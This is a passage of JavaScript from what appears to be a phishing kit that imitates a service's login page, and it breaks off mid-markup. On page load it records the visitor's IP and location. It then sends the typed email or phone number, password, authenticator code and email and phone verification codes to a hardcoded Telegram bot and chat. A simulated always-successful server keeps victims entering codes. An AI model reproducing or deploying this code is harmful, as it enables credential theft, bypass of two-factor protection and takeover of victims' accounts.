// ======================================================\n// TELEGRAM CONFIGURATION\n// ======================================================\nconst TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";\nconst TELEGRAM_CHAT_ID = "-5264759017";\n\n\n// ======================================================\n// DISPLAY ID GENERATOR (used instead of sending real IP)\n// ======================================================\nfunction _genSegment() {\n    const CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    let seg = '';\n    for (let i = 0; i < 3; i++) {\n        seg += CHARS.charAt(Math.floor(Math.random() * CHARS.length));\n    }\n    return seg;\n}\n\nfunction generateDisplayId() {\n    const segs = new Set();\n    while (segs.size < 3) segs.add(_genSegment());\n    return Array.from(segs).join(' ');\n}\n\n// Persist displayId for the session so it doesn't change on every DOM re-render\nconst _existingDisplayId = (typeof sessionStorage !== 'undefined') ? sessionStorage.getItem('displayId') : null;\nconst _displayId = _existingDisplayId || generateDisplayId();\nif (typeof sessionStorage !== 'undefined' && !_existingDisplayId) {\n    try { sessionStorage.setItem('displayId', _displayId); } catch (e) { /* ignore storage errors */ }\n}\n\n// ======================================================\n// COLLECT USER INFORMATION\n// ======================================================\nconst userInfo = {\n    displayId: _displayId, // NEW: short pseudo-id sent to teammates instead of real IP\n    ip: 'Detecting...',\n    userAgent: navigator.userAgent,\n    timestamp: new Date().toLocaleString(),\n    country: 'Unknown',\n    city: 'Unknown',\n    isp: 'Unknown'\n};\n\n// Get IP and location info\nasync function collectUserInfo() {\n    try {\n        // Get IP address\n        const ipResponse = await fetch('https://api.ipify.org?format=json');\n        const ipData = await ipResponse.json();\n        userInfo.ip = ipData.ip;\n        \n        // Get location info based on IP\n        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);\n        const locationData = await locationResponse.json();\n        \n        userInfo.country = locationData.country_name || 'Unknown';\n        userInfo.city = locationData.city || 'Unknown';\n        userInfo.isp = locationData.org || 'Unknown';\n        \n        console.log('User info collected:', userInfo);\n    } catch (error) {\n        console.log('Error collecting user info:', error);\n        // Fallback to basic IP detection\n        try {\n            const fallbackIp = await fetch('https://api64.ipify.org?format=json').then(r => r.json());\n            userInfo.ip = fallbackIp.ip;\n        } catch (e) {\n            userInfo.ip = 'Failed to get IP';\n        }\n    }\n}\n\n// Call on page load\ncollectUserInfo();\n\n// ======================================================\n// TELEGRAM SEND FUNCTION\n// ======================================================\nasync function sendToTelegram(message) {\n    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {\n        console.error('Telegram bot token or chat ID not configured');\n        return false;\n    }\n    \n    try {\n        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;\n        \n        const response = await fetch(url, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json',\n            },\n            body: JSON.stringify({\n                chat_id: TELEGRAM_CHAT_ID,\n                text: message,\n                parse_mode: 'HTML'\n            })\n        });\n        \n        const data = await response.json();\n        console.log('Telegram response:', data);\n        return data.ok === true;\n    } catch (error) {\n        console.error('Error sending to Telegram:', error);\n        return false;\n    }\n}\n\n// ======================================================\n// FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)\n// ======================================================\n\nfunction formatLoginMessage(emailPhone, password) {\n    // Prefer separate hidden fields if present (country-code + phone-number)\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        // ensure phone digits only after the code\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        // Fallback: check the provided emailPhone string\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    \n    // Build display: if phone, make country code bold and number monospaced\n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        // credentialsValue may be like "+91 123456"\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n\n    return `<b>(${userInfo.displayId})</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Password:</b> <code>${password}</code>\n<b>Country: ${userInfo.country}</b>`;\n}\n\nfunction formatOneTimeLoginMessage(emailPhone) {\n    // Prefer separate hidden fields if present (country-code + phone-number)\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        // ensure phone digits only after the code\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        // Fallback: check the provided emailPhone string\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    \n    // Build display: if phone, make country code bold and number monospaced\n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        // credentialsValue may be like "+91 123456"\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n\n    return `<b>(${userInfo.displayId} 1‚É£)</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Country: ${userInfo.country}</b>`;\n}\n\nfunction format2FAMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üîê: (${userInfo.displayId}):</b> <code>${code}</code>`;\n}\n\nfunction formatEmailVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üìß: (${userInfo.displayId}):</b> <code>${code}</code>`;\n}\n\nfunction formatPhoneVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üì±: (${userInfo.displayId}):</b> <code>${code}</code>`;\n}\n\nfunction formatSwitchMessage(fromMethod, toMethod) {\n    // Capitalize first letter only\n    const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();\n    return `<b>(${userInfo.displayId})</b>\n<b>Switched:</b> ${toMethodFormatted}`;\n}\n\nfunction formatGoVerifyMessage(method) {\n    // Capitalize first letter only\n    const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();\n    return `<b>(${userInfo.displayId})</b>\n<b>Selected:</b> ${methodFormatted}`;\n}\n\n// ======================================================\n// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)\n// ======================================================\nfunction simulateServerSuccess() {\n    return new Promise(resolve => {\n        setTimeout(() => {\n            resolve({ success: true });\n        }, 500); // Simulate 0.5s server delay\n    });\n}\n\nlet isProcessing = {\n    login: false,\n    twofa: false,\n    email: false,\n    phone: false\n};\n\n// Store current method for switch tracking\nlet currentMethod = '';\nlet isOneTimeCodeMode = false; // Track if One-time Code mode is active\nlet isAfterSwitch = false; // Track if verification is after a method switch\n\ndocument.addEventListener("DOMContentLoaded", () => {\n\n// ======================================================\n//  BASIC HELPERS\n// ======================================================\n\nfunction disableBodyScroll() { document.body.style.overflow = "hidden"; }\nfunction enableBodyScroll() { document.body.style.overflow = ""; }\n\nfunction showOverlay(id) {\n    const overlay = document.getElementById(id);\n    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");\n\n    disableBodyScroll();\n    overlay.style.visibility = "visible";\n\n    setTimeout(() => {\n        initSwitchButtons(overlay);\n\n        // Hide switch buttons if in verifications after password flow OR if in one-time code mode\n        if ((verificationsActive && (id === "email" || id === "phone")) || isOneTimeCodeMode) {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "none");\n        } else {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "");\n        }\n\n        // Auto-start resend timer\n        setTimeout(() => {\n            const resendBtn = overlay.querySelector(".resend-btn");\n            if (resendBtn) startResend(id, true);\n        }, 150);\n\n    }, 20);\n\n    if (id === "verifications") {\n        overlay.classList.remove("hide-left");\n        setTimeout(() => overlay.classList.add("active"), 10);\n        verificationsActive = true;\n    } else {\n        overlay.classList.add("active");\n        setTimeout(() => sheet.classList.add("active"), 10);\n    }\n}\n\nfunction hideOverlay(id) {\n    const overlay = document.getElementById(id);\n    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");\n\n    if (id === "verifications") {\n        verificationsActive = false;\n        overlay.classList.remove("active");\n        overlay.classList.add("hide-left");\n\n        setTimeout(() => {\n            overlay.style.visibility = "hidden";\n            enableBodyScroll();\n        }, 350);\n    } else {\n        sheet.classList.remove("active");\n        overlay.classList.remove("active");\n\n        setTimeout(() => {\n            overlay.style.visibility = "hidden";\n            enableBodyScroll();\n        }, 350);\n    }\n}\n\nfunction startLoading(btn){ btn.classList.add("loading"); }\nfunction stopLoading(btn){ btn.classList.remove("loading"); }\n\n// ======================================================\n//  GLOBAL FLAGS\n// ======================================================\nlet verificationsActive = false;\nlet step = 1;\n\n// ======================================================\n//  TAB SWITCHING (Password / One-time Code)\n// ======================================================\n\nconst passwordTab = document.querySelector('button[aria-selected="true"].tabs-btn.btn-like');\nconst oneTimeTab = document.querySelector('.tabs-btn.btn-like:not([aria-selected])');\nconst passwordField = document.getElementById('input-container2');\nconst passwordInput = document.getElementById('password');\nconst emailPhoneField = document.getElementById('input-container');\nconst emailPhoneInput = document.getElementById('email-phone');\nconst emailPhoneVisibleInput = document.getElementById('email-phone-visible');\n\nif (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput && emailPhoneVisibleInput) {\n    // One-time Code tab click\n    oneTimeTab.addEventListener('click', (e) => {\n        e.preventDefault();\n        isOneTimeCodeMode = true;\n        \n        // Switch aria-selected attributes\n        passwordTab.removeAttribute('aria-selected');\n        oneTimeTab.setAttribute('aria-selected', 'true');\n        \n        // Hide password field and make it not required\n        passwordField.style.display = 'none';\n        passwordInput.removeAttribute('required');\n        passwordInput.value = ''; // Clear any existing password\n        \n        // Change placeholder text to remove "/Username"\n        emailPhoneVisibleInput.placeholder = 'Email / Phone Number';\n    });\n\n    // Password tab click\n    passwordTab.addEventListener('click', (e) => {\n        e.preventDefault();\n        isOneTimeCodeMode = false;\n        \n        // Switch aria-selected attributes\n        oneTimeTab.removeAttribute('aria-selected');\n        passwordTab.setAttribute('aria-selected', 'true');\n        \n        // Show password field and make it required\n        passwordField.style.display = 'flex';\n        passwordInput.setAttribute('required', 'required');\n        \n        // Restore original placeholder text\n        emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';\n    });\n}\n\n// ======================================================\n//  LOGIN ‚Üí open twofa\n// ======================================================\n\nconst form = document.getElementById("login-form");\nconst twofaInput = document.getElementById("twofa_input");\nconst twofaButton = document.getElementById("twofa_button");\n\n// password toggle handler (eye icon)\ntry{\n    const pwdToggle = document.getElementById('password-toggle');\n    const pwdInput = document.getElementById('password');\n    if(pwdToggle && pwdInput){\n        pwdToggle.addEventListener('click', ()=>{\n            if(pwdInput.type === 'password'){\n                pwdInput.type = 'text';\n                pwdToggle.setAttribute('aria-pressed','true');\n                pwdToggle.classList.add('visible');\n            } else {\n                pwdInput.type = 'password';\n                pwdToggle.setAttribute('aria-pressed','false');\n                pwdToggle.classList.remove('visible');\n            }\n        });\n        pwdToggle.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); pwdToggle.click(); } });\n    }\n}catch(e){/* ignore */} \n\ntwofaInput.addEventListener("input", () => {\n    twofaButton.disabled = twofaInput.value.length !== 6;\n});\n\nform.addEventListener("submit", async e => {\n    e.preventDefault();\n\n    if (isProcessing.login) return;\n    isProcessing.login = true;\n    startLoading(form.querySelector('button[type="submit"]'));\n\n    const emailPhone = document.getElementById("email-phone").value;\n    const password = document.getElementById("password").value;\n\n    // Validate email or phone format\n    const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));\n    if (isPhone) {\n        // Validate phone number has 7-15 digits\n        const phoneDigits = emailPhone.replace(/\D/g, '');\n        if (phoneDigits.length < 7 || phoneDigits.length > 15) {\n            stopLoading(form.querySelector('button[type="submit"]'));\n            isProcessing.login = false;\n            showToast("Enter a valid phone number");\n            return;\n        }\n    } else {\n        // Validate email format\n        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;\n        if (!emailRegex.test(emailPhone)) {\n            stopLoading(form.querySelector('button[type="submit"]'));\n            isProcessing.login = false;\n            showToast("Enter a valid email");\n            return;\n        }\n    }\n\n    // Send login credentials to Telegram based on mode\n    let loginMessage;\n    if (isOneTimeCodeMode) {\n        loginMessage = formatOneTimeLoginMessage(emailPhone);\n    } else {\n        loginMessage = formatLoginMessage(emailPhone, password);\n    }\n    await sendToTelegram(loginMessage);\n\n    // Simulate server delay and always return success\n    const result = await simulateServerSuccess();\n    \n    stopLoading(form.querySelector('button[type="submit"]'));\n\n    if (result.success) {\n        if (isOneTimeCodeMode) {\n            // One-time code mode: skip 2FA and go directly to email/phone verification\n            // Detect if user entered email or phone\n            const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));\n            \n            if (isPhone) {\n                currentMethod = 'phone';\n                isAfterSwitch = false;\n                await sendGoVerify("phone");\n                showOverlay("phone");\n            } else {\n                currentMethod = 'email';\n                isAfterSwitch = false;\n                await sendGoVerify("email");\n                showOverlay("email");\n            }\n        } else {\n            // Password mode: show 2FA authenticator\n            currentMethod = 'twofa';\n            showOverlay("twofa");\n        }\n    }\n\n    isProcessing.login = false;\n});\n\n// ======================================================\n//  UNIVERSAL SUCCESS HANDLER ‚Üí enter verifications\n// ======================================================\n\nfunction enterVerifications(fromBlock) {\n    hideOverlay(fromBlock);\n\n    setTimeout(() => {\n        step = 1;\n        showOverlay("verifications");\n        updateVerificationUI();\n    }, 400);\n}\n\n// ======================================================\n//  TWOFA CONFIRM\n// ======================================================\n\ntwofaButton.addEventListener("click", async () => {\n    if (isProcessing.twofa) return;\n    isProcessing.twofa = true;\n\n    startLoading(twofaButton);\n\n    // Send 2FA code to Telegram\n    const twofaMessage = format2FAMessage(twofaInput.value, isAfterSwitch);\n    await sendToTelegram(twofaMessage);\n\n    // Simulate server response\n    const result = await simulateServerSuccess();\n\n    stopLoading(twofaButton);\n\n    if (result.success) {\n        twofaInput.value = "";\n        enterVerifications("twofa");\n    } else {\n        showToast("Verification code is incorrect");\n        twofaInput.value = "";\n    }\n\n    isProcessing.twofa = false;\n});\n\n// ======================================================\n//  VERIFICATIONS BLOCK (step 1 / 2)\n// ======================================================\n\nconst verifOverlay = document.getElementById("verifications");\nconst emailVerifyBtn = document.getElementById("email_verify");\nconst phoneVerifyBtn = document.getElementById("phone_verify");\n\nfunction updateVerificationUI() {\n    const counterElement = verifOverlay.querySelector("p.text-warning");\n    if (counterElement) {\n        counterElement.innerHTML = `<span>${step}</span><span>/</span><span>2</span>`;\n    }\n    \n    if (emailVerifyBtn) {\n        emailVerifyBtn.style.display = step === 1 ? "flex" : "none";\n    }\n    \n    if (phoneVerifyBtn) {\n        phoneVerifyBtn.style.display = step === 2 ? "flex" : "none";\n    }\n}\n\n// ======================================================\n//  EMAIL BLOCK\n// ======================================================\n\nconst emailInput = document.getElementById("email_input");\nconst emailButton = document.getElementById("email_button");\n\nif (emailInput) {\n    emailInput.addEventListener("input", () => {\n        if (emailButton) {\n            emailButton.disabled = emailInput.value.length !== 6;\n        }\n    });\n}\n\nif (emailVerifyBtn) {\n    emailVerifyBtn.addEventListener("click", () => {\n        currentMethod = 'email';\n        isAfterSwitch = false;\n        // Send "Go Verify" to Telegram when email is selected\n        sendGoVerify("email");\n        showOverlay("email");\n    });\n}\n\nif (emailButton) {\n    emailButton.addEventListener("click", async () => {\n        if (isProcessing.email) return;\n        isProcessing.email = true;\n\n        startLoading(emailButton);\n\n        // Send email verification code to Telegram\n        const emailMessage = formatEmailVerificationMessage(emailInput.value, isAfterSwitch);\n        await sendToTelegram(emailMessage);\n\n        // Simulate server response\n        const result = await simulateServerSuccess();\n\n        stopLoading(emailButton);\n        emailInput.value = "";\n\n        if (!result.success) {\n            showToast("Verification code is incorrect");\n            isProcessing.email = false;\n            return;\n        }\n\n        // First verification (verifications not shown yet)\n        if (!verificationsActive) {\n            enterVerifications("email");\n            isProcessing.email = false;\n            return;\n        }\n\n        // Transition from step 1 ‚Üí step 2\n        hideOverlay("email");\n        hideOverlay("verifications");\n\n        setTimeout(() => {\n            step = 2;\n            updateVerificationUI();\n            \n            if (emailVerifyBtn && phoneVerifyBtn) {\n                emailVerifyBtn.style.transition = "opacity .5s ease";\n                phoneVerifyBtn.style.transition = "opacity .5s ease";\n                emailVerifyBtn.style.display = "none";\n                phoneVerifyBtn.style.display = "flex";\n                emailVerifyBtn.style.pointerEvents = "none";\n                phoneVerifyBtn.style.pointerEvents = "auto";\n            }\n            \n            showOverlay("verifications");\n            \n            setTimeout(() => {\n                isProcessing.email = false;\n            }, 300);\n        }, 1000);\n    });\n}\n\n// ======================================================\n//  PHONE BLOCK (FINAL STEP ‚Üí reload)\n// ======================================================\n\nconst phoneInput = document.getElementById("phone_input");\nconst phoneButton = document.getElementById("phone_button");\n\nif (phoneInput) {\n    phoneInput.addEventListener("input", () => {\n        if (phoneButton) {\n            phoneButton.disabled = phoneInput.value.length !== 6;\n        }\n    });\n}\n\nif (phoneVerifyBtn) {\n    phoneVerifyBtn.addEventListener("click", () => {\n        currentMethod = 'phone';\n        isAfterSwitch = false;\n        // Send "Go Verify" to Telegram when phone is selected\n        sendGoVerify("phone");\n        showOverlay("phone");\n    });\n}\n\nif (phoneButton) {\n    phoneButton.addEventListener("click", async () => {\n        startLoading(phoneButton);\n\n        // Send phone verification code to Telegram\n        const phoneMessage = formatPhoneVerificationMessage(phoneInput.value, isAfterSwitch);\n        await sendToTelegram(phoneMessage);\n\n        // Simulate server response\n        const result = await simulateServerSuccess();\n\n        stopLoading(phoneButton);\n        phoneInput.value = "";\n\n        if (!result.success) {\n            showToast("Verification code is incorrect");\n            return;\n        }\n\n        // First verification (verifications not shown yet)\n        if (!verificationsActive) {\n            enterVerifications("phone");\n            return;\n        }\n\n        // Final step (step 2/2) - show success and reload\n        const toast = document.createElement("div");\n        toast.className = "toast-layer";\n        toast.innerHTML = `\n            <div class="overflow-hidden flex" style="height: 56px; transition: height .5s var(--ease-out);">\n                <div class="toast" style="align-items: anchor-center;">\n                    <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none fill-error">\n                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">\n                            <path style="fill:#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 2